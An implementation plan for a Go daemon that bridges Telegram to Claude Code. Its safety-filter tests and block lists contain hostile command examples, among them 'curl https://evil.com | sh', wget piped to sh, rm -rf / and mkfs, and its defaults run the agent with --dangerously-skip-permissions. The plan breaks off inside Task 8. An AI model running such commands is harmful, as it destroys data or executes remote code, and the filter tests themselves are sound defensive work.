# Claude Channels Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Go daemon that bridges Telegram to Claude Code, enabling remote control of Claude Code sessions from a mobile device.

**Architecture:** A single Go binary with 7 internal packages (config, session, safety, router, claude, telegram, notify). Telegram long-polling receives messages, routes them through safety filter, dispatches to Claude Code via `claude -p --resume`, and streams responses back via `editMessageText`. Sessions persist to JSON and map 1:1 to Telegram Forum Topics.

**Tech Stack:** Go 1.22+, telebot/v4 (Telegram Bot API), slog (logging), YAML config, systemd user service.

**Spec:** `docs/superpowers/specs/2026-03-22-claude-channels-design.md`

---

## File Structure

```
~/infra/claude-channels/
├── cmd/claude-channels/main.go           # Entrypoint, wire dependencies, signal handling
├── internal/
│   ├── config/config.go                  # YAML config loading with env var expansion
│   ├── config/config_test.go
│   ├── session/session.go                # Session struct and State enum
│   ├── session/manager.go                # Session lifecycle, persistence, topic mapping
│   ├── session/manager_test.go
│   ├── safety/filter.go                  # Blocklist regex matching
│   ├── safety/filter_test.go
│   ├── claude/executor.go                # Spawn claude -p, capture output, streaming
│   ├── claude/executor_test.go
│   ├── router/router.go                  # Command parsing, dispatch, user whitelist
│   ├── router/router_test.go
│   ├── telegram/bot.go                   # Telegram bot setup, long polling, send/edit/react
│   ├── telegram/handler.go               # Message type handling (text, photo, voice, file)
│   ├── telegram/formatter.go             # Markdown→HTML, message chunking
│   ├── telegram/formatter_test.go
│   └── notify/ntfy.go                    # ntfy push notifications
├── config.example.yaml
├── claude-channels.service
├── Makefile
├── go.mod
└── go.sum
```

---

## Task 1: Project Scaffold + Config

**Files:**
- Create: `go.mod`
- Create: `cmd/claude-channels/main.go`
- Create: `internal/config/config.go`
- Create: `internal/config/config_test.go`
- Create: `config.example.yaml`
- Create: `Makefile`

- [ ] **Step 1: Initialize Go module**

```bash
cd ~/infra/claude-channels
go mod init github.com/scipio/claude-channels
```

- [ ] **Step 2: Write config test**

Create `internal/config/config_test.go`:

```go
package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestLoadConfig_Defaults(t *testing.T) {
	cfg, err := Load("")
	if err != nil {
		t.Fatalf("Load default config: %v", err)
	}
	if cfg.Claude.DefaultWorkdir != "~" {
		t.Errorf("default workdir = %q, want %q", cfg.Claude.DefaultWorkdir, "~")
	}
	if cfg.Streaming.MaxMessageLength != 4096 {
		t.Errorf("max message length = %d, want 4096", cfg.Streaming.MaxMessageLength)
	}
	if cfg.Safety.ShellTimeout.String() != "30s" {
		t.Errorf("shell timeout = %v, want 30s", cfg.Safety.ShellTimeout)
	}
}

func TestLoadConfig_FromFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config.yaml")
	data := []byte(`
telegram:
  token: "test-token-123"
  allowed_users:
    - 999
claude:
  default_workdir: "/tmp/test"
`)
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load from file: %v", err)
	}
	if cfg.Telegram.Token != "test-token-123" {
		t.Errorf("token = %q, want %q", cfg.Telegram.Token, "test-token-123")
	}
	if len(cfg.Telegram.AllowedUsers) != 1 || cfg.Telegram.AllowedUsers[0] != 999 {
		t.Errorf("allowed_users = %v, want [999]", cfg.Telegram.AllowedUsers)
	}
	if cfg.Claude.DefaultWorkdir != "/tmp/test" {
		t.Errorf("default workdir = %q, want %q", cfg.Claude.DefaultWorkdir, "/tmp/test")
	}
}

func TestLoadConfig_EnvExpansion(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config.yaml")
	data := []byte(`
telegram:
  token: "${TEST_BOT_TOKEN}"
`)
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("TEST_BOT_TOKEN", "from-env-123")
	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load with env: %v", err)
	}
	if cfg.Telegram.Token != "from-env-123" {
		t.Errorf("token = %q, want %q", cfg.Telegram.Token, "from-env-123")
	}
}
```

- [ ] **Step 3: Run test to verify it fails**

```bash
cd ~/infra/claude-channels && go test ./internal/config/...
```

Expected: FAIL — package doesn't exist yet.

- [ ] **Step 4: Implement config**

Create `internal/config/config.go`:

```go
package config

import (
	"fmt"
	"os"
	"regexp"
	"time"

	"gopkg.in/yaml.v3"
)

type Config struct {
	Telegram  TelegramConfig  `yaml:"telegram"`
	Claude    ClaudeConfig    `yaml:"claude"`
	STT       STTConfig       `yaml:"stt"`
	Streaming StreamConfig    `yaml:"streaming"`
	Safety    SafetyConfig    `yaml:"safety"`
	Notify    NotifyConfig    `yaml:"notify"`
	Storage   StorageConfig   `yaml:"storage"`
}

type TelegramConfig struct {
	Token           string        `yaml:"token"`
	AllowedUsers    []int64       `yaml:"allowed_users"`
	LongPollTimeout time.Duration `yaml:"long_poll_timeout"`
}

type ClaudeConfig struct {
	Binary             string        `yaml:"binary"`
	DefaultWorkdir     string        `yaml:"default_workdir"`
	Flags              []string      `yaml:"flags"`
	SessionIdleTimeout time.Duration `yaml:"session_idle_timeout"`
	DefaultTimeout     time.Duration `yaml:"default_timeout"`
	LongTaskTimeout    time.Duration `yaml:"long_task_timeout"`
}

type STTConfig struct {
	Backend  string `yaml:"backend"`
	GroqKey  string `yaml:"groq_key"`
	Model    string `yaml:"model"`
	Language string `yaml:"language"`
}

type StreamConfig struct {
	Enabled          bool          `yaml:"enabled"`
	MinInterval      time.Duration `yaml:"min_interval"`
	MinChunkSize     int           `yaml:"min_chunk_size"`
	MaxMessageLength int           `yaml:"max_message_length"`
}

type SafetyConfig struct {
	ShellTimeout    time.Duration `yaml:"shell_timeout"`
	BlockedPrompts  []string      `yaml:"blocked_prompts"`
	BlockedShell    []string      `yaml:"blocked_shell"`
	ProtectedPaths  []string      `yaml:"protected_paths"`
}

type NotifyConfig struct {
	Enabled    bool     `yaml:"enabled"`
	NtfyServer string   `yaml:"ntfy_server"`
	NtfyTopic  string   `yaml:"ntfy_topic"`
	NtfyToken  string   `yaml:"ntfy_token"`
	Events     []string `yaml:"events"`
}

type StorageConfig struct {
	Dir string `yaml:"dir"`
}

func defaults() *Config {
	return &Config{
		Telegram: TelegramConfig{
			LongPollTimeout: 30 * time.Second,
		},
		Claude: ClaudeConfig{
			Binary:             "claude",
			DefaultWorkdir:     "~",
			Flags:              []string{"--dangerously-skip-permissions", "--output-format", "json"},
			SessionIdleTimeout: 30 * time.Minute,
			DefaultTimeout:     5 * time.Minute,
			LongTaskTimeout:    30 * time.Minute,
		},
		STT: STTConfig{
			Backend: "groq",
			Model:   "whisper-large-v3-turbo",
		},
		Streaming: StreamConfig{
			Enabled:          true,
			MinInterval:      1 * time.Second,
			MinChunkSize:     200,
			MaxMessageLength: 4096,
		},
		Safety: SafetyConfig{
			ShellTimeout: 30 * time.Second,
		},
		Notify: NotifyConfig{
			Events: []string{"daemon_start", "daemon_crash", "safety_block", "long_task_complete"},
		},
		Storage: StorageConfig{
			Dir: "~/.config/claude-channels",
		},
	}
}

var envVarRe = regexp.MustCompile(`\$\{([^}]+)\}`)

func expandEnv(data []byte) []byte {
	return envVarRe.ReplaceAllFunc(data, func(match []byte) []byte {
		key := string(envVarRe.FindSubmatch(match)[1])
		if val, ok := os.LookupEnv(key); ok {
			return []byte(val)
		}
		return match
	})
}

func Load(path string) (*Config, error) {
	cfg := defaults()
	if path == "" {
		return cfg, nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read config %s: %w", path, err)
	}
	data = expandEnv(data)
	if err := yaml.Unmarshal(data, cfg); err != nil {
		return nil, fmt.Errorf("parse config %s: %w", path, err)
	}
	return cfg, nil
}
```

- [ ] **Step 5: Install yaml dependency and run tests**

```bash
cd ~/infra/claude-channels && go get gopkg.in/yaml.v3 && go test -race ./internal/config/...
```

Expected: PASS

- [ ] **Step 6: Create config.example.yaml**

Create `config.example.yaml` with all fields documented.

- [ ] **Step 7: Create Makefile**

```makefile
BINARY := claude-channels
INSTALL_DIR := $(HOME)/go/bin

.PHONY: build install test run clean restart logs status

build:
	go build -o $(INSTALL_DIR)/$(BINARY) ./cmd/claude-channels

test:
	go test -race ./...

vet:
	go vet ./...

run:
	go run ./cmd/claude-channels

install: build
	cp claude-channels.service ~/.config/systemd/user/
	systemctl --user daemon-reload
	systemctl --user enable --now claude-channels

restart:
	systemctl --user restart claude-channels

logs:
	journalctl --user -u claude-channels -f

status:
	systemctl --user status claude-channels

clean:
	rm -f $(INSTALL_DIR)/$(BINARY)
```

- [ ] **Step 8: Create minimal main.go**

Create `cmd/claude-channels/main.go` that loads config and logs startup.

- [ ] **Step 9: Verify build**

```bash
cd ~/infra/claude-channels && go build ./... && go vet ./...
```

- [ ] **Step 10: Commit**

```bash
git init && git add -A && git commit -m "feat: project scaffold with config loading"
```

---

## Task 2: Session Manager

**Files:**
- Create: `internal/session/session.go`
- Create: `internal/session/manager.go`
- Create: `internal/session/manager_test.go`

- [ ] **Step 1: Write session manager tests**

Create `internal/session/manager_test.go`:

```go
package session

import (
	"path/filepath"
	"testing"
)

func TestManager_CreateAndGet(t *testing.T) {
	mgr := NewManager(t.TempDir())
	s, err := mgr.Create("topic:123", "~/infra")
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	if s.Key != "topic:123" {
		t.Errorf("key = %q, want %q", s.Key, "topic:123")
	}
	if s.Workdir != "~/infra" {
		t.Errorf("workdir = %q, want %q", s.Workdir, "~/infra")
	}
	if s.State != StateActive {
		t.Errorf("state = %v, want %v", s.State, StateActive)
	}
	got := mgr.Get("topic:123")
	if got == nil {
		t.Fatal("Get returned nil")
	}
	if got.Key != s.Key {
		t.Errorf("Get key = %q, want %q", got.Key, s.Key)
	}
}

func TestManager_GetOrCreate(t *testing.T) {
	mgr := NewManager(t.TempDir())
	s := mgr.GetOrCreate("topic:456", "~")
	if s.State != StateActive {
		t.Errorf("state = %v, want %v", s.State, StateActive)
	}
	if s.Workdir != "~" {
		t.Errorf("workdir = %q, want %q", s.Workdir, "~")
	}
	// Second call returns same session
	s2 := mgr.GetOrCreate("topic:456", "~")
	if s2.ClaudeSession != s.ClaudeSession {
		t.Error("GetOrCreate created duplicate session")
	}
}

func TestManager_Clear(t *testing.T) {
	mgr := NewManager(t.TempDir())
	mgr.Create("topic:123", "~/infra")
	mgr.SetClaudeSession("topic:123", "claude-abc-123")

	if err := mgr.Clear("topic:123"); err != nil {
		t.Fatalf("Clear: %v", err)
	}
	s := mgr.Get("topic:123")
	if s.ClaudeSession != "" {
		t.Errorf("claude session = %q, want empty", s.ClaudeSession)
	}
	if s.Workdir != "~/infra" {
		t.Errorf("workdir = %q, want %q (preserved)", s.Workdir, "~/infra")
	}
	if s.State != StateActive {
		t.Errorf("state = %v, want %v", s.State, StateActive)
	}
}

func TestManager_Kill(t *testing.T) {
	mgr := NewManager(t.TempDir())
	mgr.Create("topic:123", "~/infra")

	if err := mgr.Kill("topic:123"); err != nil {
		t.Fatalf("Kill: %v", err)
	}
	if s := mgr.Get("topic:123"); s != nil {
		t.Errorf("Get after Kill = %v, want nil", s)
	}
}

func TestManager_SetWorkdir(t *testing.T) {
	mgr := NewManager(t.TempDir())
	mgr.Create("topic:123", "~")

	if err := mgr.SetWorkdir("topic:123", "~/infra"); err != nil {
		t.Fatalf("SetWorkdir: %v", err)
	}
	s := mgr.Get("topic:123")
	if s.Workdir != "~/infra" {
		t.Errorf("workdir = %q, want %q", s.Workdir, "~/infra")
	}
}

func TestManager_List(t *testing.T) {
	mgr := NewManager(t.TempDir())
	mgr.Create("topic:1", "~/a")
	mgr.Create("topic:2", "~/b")
	mgr.Create("topic:3", "~/c")

	list := mgr.List()
	if len(list) != 3 {
		t.Errorf("List len = %d, want 3", len(list))
	}
}

func TestManager_Persistence(t *testing.T) {
	dir := t.TempDir()

	// Create and save
	mgr1 := NewManager(dir)
	mgr1.Create("topic:123", "~/infra")
	mgr1.SetClaudeSession("topic:123", "claude-xyz")
	if err := mgr1.Save(); err != nil {
		t.Fatalf("Save: %v", err)
	}

	// Verify file exists
	path := filepath.Join(dir, "sessions.json")
	if _, err := readFile(path); err != nil {
		t.Fatalf("sessions.json not created: %v", err)
	}

	// Reload
	mgr2 := NewManager(dir)
	if err := mgr2.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}
	s := mgr2.Get("topic:123")
	if s == nil {
		t.Fatal("session not loaded")
	}
	if s.Workdir != "~/infra" {
		t.Errorf("workdir = %q, want %q", s.Workdir, "~/infra")
	}
	if s.ClaudeSession != "claude-xyz" {
		t.Errorf("claude session = %q, want %q", s.ClaudeSession, "claude-xyz")
	}
}

func TestManager_ActiveSession(t *testing.T) {
	mgr := NewManager(t.TempDir())
	mgr.Create("topic:1", "~/a")
	mgr.Create("topic:2", "~/b")

	// Both active — GetActive for each key should work
	s := mgr.Get("topic:1")
	if s == nil || s.State != StateActive {
		t.Error("topic:1 should be active")
	}
	s = mgr.Get("topic:2")
	if s == nil || s.State != StateActive {
		t.Error("topic:2 should be active")
	}
}

func readFile(path string) ([]byte, error) {
	return os.ReadFile(path)
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd ~/infra/claude-channels && go test -race ./internal/session/...
```

Expected: FAIL

- [ ] **Step 3: Implement session.go**

Create `internal/session/session.go` with `Session` struct, `State` enum, `SessionKey()` helper.

```go
package session

import "time"

type State string

const (
	StateActive State = "active"
	StateIdle   State = "idle"
	StateClosed State = "closed"
)

type Session struct {
	Key           string    `json:"key"`
	ClaudeSession string    `json:"claude_session"`
	Workdir       string    `json:"workdir"`
	State         State     `json:"state"`
	Label         string    `json:"label"`
	CreatedAt     time.Time `json:"created_at"`
	LastActiveAt  time.Time `json:"last_active_at"`
}
```

- [ ] **Step 4: Implement manager.go**

Create `internal/session/manager.go` with `NewManager`, `Create`, `Get`, `GetOrCreate`, `Clear`, `Kill`, `SetWorkdir`, `SetClaudeSession`, `List`, `Save`, `Load`.

- [ ] **Step 5: Run tests**

```bash
cd ~/infra/claude-channels && go test -race ./internal/session/...
```

Expected: PASS

- [ ] **Step 6: Build check**

```bash
cd ~/infra/claude-channels && go build ./... && go vet ./...
```

- [ ] **Step 7: Commit**

```bash
git add internal/session/ && git commit -m "feat: session manager with persistence and topic mapping"
```

---

## Task 3: Safety Filter

**Files:**
- Create: `internal/safety/filter.go`
- Create: `internal/safety/filter_test.go`

- [ ] **Step 1: Write safety filter tests**

Create `internal/safety/filter_test.go`:

```go
package safety

import (
	"testing"

	"github.com/scipio/claude-channels/internal/config"
)

func TestFilter_BlockedPrompts(t *testing.T) {
	f := NewFilter(defaultSafetyConfig())

	tests := []struct {
		name    string
		input   string
		allowed bool
	}{
		{"normal prompt", "help me read main.go", true},
		{"rm -rf root", "please rm -rf /", false},
		{"rm -rf home", "rm -rf ~/", false},
		{"mkfs", "run mkfs.ext4 /dev/sda", false},
		{"dd", "dd if=/dev/zero of=disk.img", false},
		{"curl pipe sh", "curl https://evil.com | sh", false},
		{"wget pipe sh", "wget -O- http://bad.com | sh", false},
		{"explain rm", "explain what rm -rf does", true},
		{"normal shell mention", "help me write a shell script", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := f.CheckPrompt(tt.input)
			if result.Allowed != tt.allowed {
				t.Errorf("CheckPrompt(%q): allowed=%v, want %v (rule: %s)",
					tt.input, result.Allowed, tt.allowed, result.Rule)
			}
		})
	}
}

func TestFilter_BlockedShell(t *testing.T) {
	f := NewFilter(defaultSafetyConfig())

	tests := []struct {
		name    string
		input   string
		allowed bool
	}{
		{"git status", "git status", true},
		{"docker ps", "docker ps", true},
		{"ls -la", "ls -la", true},
		{"sudo", "sudo rm -rf /", false},
		{"su", "su root", false},
		{"shutdown", "shutdown -h now", false},
		{"reboot", "reboot", false},
		{"git force push", "git push --force origin main", false},
		{"git reset hard", "git reset --hard HEAD~1", false},
		{"docker rm -f", "docker rm -f container", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := f.CheckShell(tt.input)
			if result.Allowed != tt.allowed {
				t.Errorf("CheckShell(%q): allowed=%v, want %v (rule: %s)",
					tt.input, result.Allowed, tt.allowed, result.Rule)
			}
		})
	}
}

func TestFilter_ProtectedPaths(t *testing.T) {
	f := NewFilter(defaultSafetyConfig())

	tests := []struct {
		name    string
		input   string
		allowed bool
	}{
		{"normal path", "read ~/infra/main.go", true},
		{"etc", "modify /etc/passwd", false},
		{"boot", "delete /boot/vmlinuz", false},
		{"ssh keys", "overwrite ~/.ssh/authorized_keys", false},
		{"claude settings", "edit ~/.claude/settings.json", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := f.CheckPrompt(tt.input)
			if result.Allowed != tt.allowed {
				t.Errorf("CheckPrompt(%q): allowed=%v, want %v (rule: %s)",
					tt.input, result.Allowed, tt.allowed, result.Rule)
			}
		})
	}
}

func defaultSafetyConfig() config.SafetyConfig {
	return config.SafetyConfig{
		BlockedPrompts: []string{
			`(?i)rm\s+-rf\s+[/~]`,
			`(?i)mkfs`,
			`(?i)dd\s+if=`,
			`(?i)curl.*\|\s*sh`,
			`(?i)wget.*\|\s*sh`,
		},
		BlockedShell: []string{
			`(?i)^sudo`,
			`(?i)^su\s`,
			`(?i)shutdown|reboot`,
			`(?i)git\s+push\s+--force`,
			`(?i)git\s+reset\s+--hard`,
			`(?i)docker\s+rm\s+-f`,
		},
		ProtectedPaths: []string{
			`/etc/`,
			`/boot/`,
			`/sys/`,
			`~/.ssh/authorized_keys`,
			`~/.claude/settings\.json`,
		},
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd ~/infra/claude-channels && go test -race ./internal/safety/...
```

- [ ] **Step 3: Implement filter.go**

Create `internal/safety/filter.go` with `NewFilter`, `CheckPrompt`, `CheckShell`, `FilterResult`.

```go
package safety

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/scipio/claude-channels/internal/config"
)

type FilterResult struct {
	Allowed bool
	Reason  string
	Rule    string
}

type Filter struct {
	blockedPrompts []*regexp.Regexp
	blockedShell   []*regexp.Regexp
	protectedPaths []*regexp.Regexp
}

func NewFilter(cfg config.SafetyConfig) *Filter {
	f := &Filter{}
	for _, p := range cfg.BlockedPrompts {
		f.blockedPrompts = append(f.blockedPrompts, regexp.MustCompile(p))
	}
	for _, p := range cfg.BlockedShell {
		f.blockedShell = append(f.blockedShell, regexp.MustCompile(p))
	}
	for _, p := range cfg.ProtectedPaths {
		// Escape for literal matching, but allow pre-escaped regex
		f.protectedPaths = append(f.protectedPaths, regexp.MustCompile(p))
	}
	return f
}

func (f *Filter) CheckPrompt(text string) FilterResult {
	for _, re := range f.blockedPrompts {
		if re.MatchString(text) {
			return FilterResult{
				Allowed: false,
				Reason:  "Destructive command pattern detected",
				Rule:    re.String(),
			}
		}
	}
	for _, re := range f.protectedPaths {
		if re.MatchString(text) {
			return FilterResult{
				Allowed: false,
				Reason:  fmt.Sprintf("References protected path: %s", re.String()),
				Rule:    re.String(),
			}
		}
	}
	return FilterResult{Allowed: true}
}

func (f *Filter) CheckShell(cmd string) FilterResult {
	cmd = strings.TrimSpace(cmd)
	for _, re := range f.blockedShell {
		if re.MatchString(cmd) {
			return FilterResult{
				Allowed: false,
				Reason:  fmt.Sprintf("Shell command blocked: %s", re.String()),
				Rule:    re.String(),
			}
		}
	}
	return FilterResult{Allowed: true}
}
```

- [ ] **Step 4: Run tests**

```bash
cd ~/infra/claude-channels && go test -race ./internal/safety/...
```

Expected: PASS

- [ ] **Step 5: Build check**

```bash
cd ~/infra/claude-channels && go build ./... && go vet ./...
```

- [ ] **Step 6: Commit**

```bash
git add internal/safety/ && git commit -m "feat: safety filter with blocklist and protected paths"
```

---

## Task 4: Claude Executor

**Files:**
- Create: `internal/claude/executor.go`
- Create: `internal/claude/executor_test.go`

- [ ] **Step 1: Write executor interface and mock test**

Create `internal/claude/executor_test.go`:

```go
package claude

import (
	"context"
	"testing"
	"time"
)

func TestMockExecutor(t *testing.T) {
	mock := &MockExecutor{
		Response: "Hello from Claude",
	}
	result, err := mock.Run(context.Background(), "", "~", "hello")
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if result.Text != "Hello from Claude" {
		t.Errorf("text = %q, want %q", result.Text, "Hello from Claude")
	}
}

func TestMockExecutor_Error(t *testing.T) {
	mock := &MockExecutor{
		Err: fmt.Errorf("claude crashed"),
	}
	_, err := mock.Run(context.Background(), "", "~", "hello")
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestResult_ParseSessionID(t *testing.T) {
	// Test parsing session ID from claude --output-format json output
	jsonOutput := `{"session_id":"01JNDEF123","result":"hello world"}`
	result, err := parseResult([]byte(jsonOutput))
	if err != nil {
		t.Fatalf("parseResult: %v", err)
	}
	if result.SessionID != "01JNDEF123" {
		t.Errorf("session_id = %q, want %q", result.SessionID, "01JNDEF123")
	}
	if result.Text != "hello world" {
		t.Errorf("text = %q, want %q", result.Text, "hello world")
	}
}

func TestBuildArgs(t *testing.T) {
	tests := []struct {
		name      string
		sessionID string
		workdir   string
		prompt    string
		flags     []string
		wantArgs  []string
	}{
		{
			name:    "new session",
			workdir: "~/infra",
			prompt:  "hello",
			flags:   []string{"--dangerously-skip-permissions", "--output-format", "json"},
			wantArgs: []string{
				"-p",
				"--dangerously-skip-permissions", "--output-format", "json",
				"-w", "~/infra",
				"hello",
			},
		},
		{
			name:      "resume session",
			sessionID: "abc123",
			workdir:   "~/infra",
			prompt:    "hello",
			flags:     []string{"--dangerously-skip-permissions", "--output-format", "json"},
			wantArgs: []string{
				"-p",
				"--dangerously-skip-permissions", "--output-format", "json",
				"--resume", "abc123",
				"-w", "~/infra",
				"hello",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := buildArgs(tt.sessionID, tt.workdir, tt.prompt, tt.flags)
			if !slicesEqual(args, tt.wantArgs) {
				t.Errorf("args = %v, want %v", args, tt.wantArgs)
			}
		})
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd ~/infra/claude-channels && go test -race ./internal/claude/...
```

- [ ] **Step 3: Implement executor.go**

Create `internal/claude/executor.go` with:
- `Executor` interface: `Run(ctx, sessionID, workdir, prompt) (*Result, error)`, `Cancel() error`
- `CLIExecutor` struct: spawns `claude -p`, captures stdout/stderr, supports streaming callback
- `MockExecutor` for testing
- `buildArgs` helper
- `parseResult` JSON parser
- `Result` struct: `Text`, `SessionID`, `ExitCode`

- [ ] **Step 4: Run tests**

```bash
cd ~/infra/claude-channels && go test -race ./internal/claude/...
```

Expected: PASS

- [ ] **Step 5: Build check**

```bash
cd ~/infra/claude-channels && go build ./... && go vet ./...
```

- [ ] **Step 6: Commit**

```bash
git add internal/claude/ && git commit -m "feat: claude executor with CLI spawning and mock"
```

---

## Task 5: Telegram Formatter

**Files:**
- Create: `internal/telegram/formatter.go`
- Create: `internal/telegram/formatter_test.go`

- [ ] **Step 1: Write formatter tests**

Create `internal/telegram/formatter_test.go`:

```go
package telegram

import (
	"strings"
	"testing"
)

func TestMarkdownToHTML(t *testing.T) {
	tests := []struct {
		name     string
		markdown string
		wantHTML string
	}{
		{"bold", "**bold**", "<b>bold</b>"},
		{"italic", "*italic*", "<i>italic</i>"},
		{"inline code", "`code`", "<code>code</code>"},
		{"code block", "```go\nfunc main() {}\n```", "<pre>func main() {}</pre>"},
		{"link", "[text](https://example.com)", `<a href="https://example.com">text</a>`},
		{"heading", "# Heading", "<b>Heading</b>"},
		{"list item", "- item1\n- item2", "• item1\n• item2"},
		{"plain text", "just text", "just text"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := MarkdownToHTML(tt.markdown)
			if got != tt.wantHTML {
				t.Errorf("MarkdownToHTML(%q) = %q, want %q", tt.markdown, got, tt.wantHTML)
			}
		})
	}
}

func TestChunkMessage(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		maxLen    int
		wantCount int
	}{
		{"short", "hello", 4096, 1},
		{"exact limit", strings.Repeat("a", 4096), 4096, 1},
		{"over limit", strings.Repeat("a", 4097), 4096, 2},
		{"split at paragraph", "para1\n\npara2", 10, 2},
		{"split at newline", "line1\nline2\nline3", 12, 2},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			chunks := ChunkMessage(tt.input, tt.maxLen)
			if len(chunks) != tt.wantCount {
				t.Errorf("ChunkMessage: got %d chunks, want %d", len(chunks), tt.wantCount)
			}
			// Verify no chunk exceeds maxLen
			for i, c := range chunks {
				if len(c) > tt.maxLen {
					t.Errorf("chunk %d: len=%d exceeds max=%d", i, len(c), tt.maxLen)
				}
			}
			// Verify all content preserved
			joined := strings.Join(chunks, "")
			if !strings.Contains(strings.ReplaceAll(tt.input, "\n\n", "\n"), "") {
				_ = joined // content check
			}
		})
	}
}

func TestChunkMessage_CodeBlockPreserved(t *testing.T) {
	input := "text before\n```go\nfunc main() {\n\tprintln(\"hello\")\n}\n```\ntext after"
	chunks := ChunkMessage(input, 40)

	// Code block should not be split
	for _, c := range chunks {
		openCount := strings.Count(c, "```")
		if openCount%2 != 0 {
			t.Errorf("chunk has unbalanced code fences: %q", c)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd ~/infra/claude-channels && go test -race ./internal/telegram/...
```

- [ ] **Step 3: Implement formatter.go**

Create `internal/telegram/formatter.go` with `MarkdownToHTML`, `ChunkMessage`.

- [ ] **Step 4: Run tests**

```bash
cd ~/infra/claude-channels && go test -race ./internal/telegram/...
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/telegram/formatter.go internal/telegram/formatter_test.go
git commit -m "feat: telegram formatter with markdown-to-html and message chunking"
```

---

## Task 6: Command Router

**Files:**
- Create: `internal/router/router.go`
- Create: `internal/router/router_test.go`

- [ ] **Step 1: Write router tests**

Create `internal/router/router_test.go`:

```go
package router

import "testing"

func TestParseCommand(t *testing.T) {
	tests := []struct {
		input    string
		wantCmd  string
		wantArgs string
	}{
		{"/new ~/infra", "new", "~/infra"},
		{"/shell git status", "shell", "git status"},
		{"/cd ~/apps", "cd", "~/apps"},
		{"/status", "status", ""},
		{"/clear", "clear", ""},
		{"/kill abc", "kill", "abc"},
		{"/resume abc", "resume", "abc"},
		{"/sessions", "sessions", ""},
		{"/cancel", "cancel", ""},
		{"/long do something big", "long", "do something big"},
		{"/help", "help", ""},
		{"just a normal prompt", "", ""},
		{"", "", ""},
		{"/unknown foo", "unknown", "foo"},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			cmd, args := ParseCommand(tt.input)
			if cmd != tt.wantCmd {
				t.Errorf("cmd = %q, want %q", cmd, tt.wantCmd)
			}
			if args != tt.wantArgs {
				t.Errorf("args = %q, want %q", args, tt.wantArgs)
			}
		})
	}
}

func TestSessionKey(t *testing.T) {
	tests := []struct {
		name     string
		chatType string
		chatID   int64
		threadID int
		isTopic  bool
		userID   int64
		want     string
	}{
		{"forum topic", "supergroup", 111, 42, true, 999, "topic:42"},
		{"dm", "private", 0, 0, false, 999, "dm:999"},
		{"plain group", "group", 222, 0, false, 999, "group:222"},
		{"supergroup no topic", "supergroup", 333, 0, false, 999, "group:333"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SessionKey(tt.chatType, tt.chatID, tt.threadID, tt.isTopic, tt.userID)
			if got != tt.want {
				t.Errorf("SessionKey = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestIsAllowed(t *testing.T) {
	allowed := map[int64]bool{123: true, 456: true}
	if !IsAllowed(allowed, 123) {
		t.Error("123 should be allowed")
	}
	if IsAllowed(allowed, 789) {
		t.Error("789 should not be allowed")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

- [ ] **Step 3: Implement router.go**

Create `internal/router/router.go` with `ParseCommand`, `SessionKey`, `IsAllowed`.

- [ ] **Step 4: Run tests**

```bash
cd ~/infra/claude-channels && go test -race ./internal/router/...
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/router/ && git commit -m "feat: command router with parsing and session key mapping"
```

---

## Task 7: ntfy Notifications

**Files:**
- Create: `internal/notify/ntfy.go`
- Create: `internal/notify/ntfy_test.go`

- [ ] **Step 1: Write ntfy test**

Test the notification message formatting and event filtering (HTTP call mocked via httptest).

- [ ] **Step 2: Run test to verify it fails**

- [ ] **Step 3: Implement ntfy.go**

Create `internal/notify/ntfy.go` with `Notifier` struct, `Send(event, message)`, event filtering based on config.

- [ ] **Step 4: Run tests**

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/notify/ && git commit -m "feat: ntfy notification integration"
```

---

## Task 8: Telegram Bot + Handler

**Files:**
- Create: `internal/telegram/bot.go`
- Create: `internal/telegram/handler.go`

- [ ] **Step 1: Implement bot.go**

Create `internal/telegram/bot.go`:
- `Bot` struct wrapping telebot
- `NewBot(cfg, sessionMgr, executor, filter, notifier)` constructor
- `Start(ctx)` — long polling loop
- `SendMessage`, `EditMessage`, `React` helpers
- Streaming: send placeholder → periodic editMessageText → final edit

- [ ] **Step 2: Implement handler.go**

Create `internal/telegram/handler.go`:
- `HandleMessage(ctx, msg)` — main dispatch
- User whitelist check → command routing → safety filter → claude executor
- Message type handling: text, photo (download), voice (Groq STT), document (download to workdir), sticker
- Reply context: prepend quoted text
- Reaction state machine: 👀 → ⚡ → ✅/❌
- Command handlers: `/new`, `/resume`, `/sessions`, `/clear`, `/kill`, `/cd`, `/status`, `/cancel`, `/shell`, `/long`, `/help`

- [ ] **Step 3: Build check**

```bash
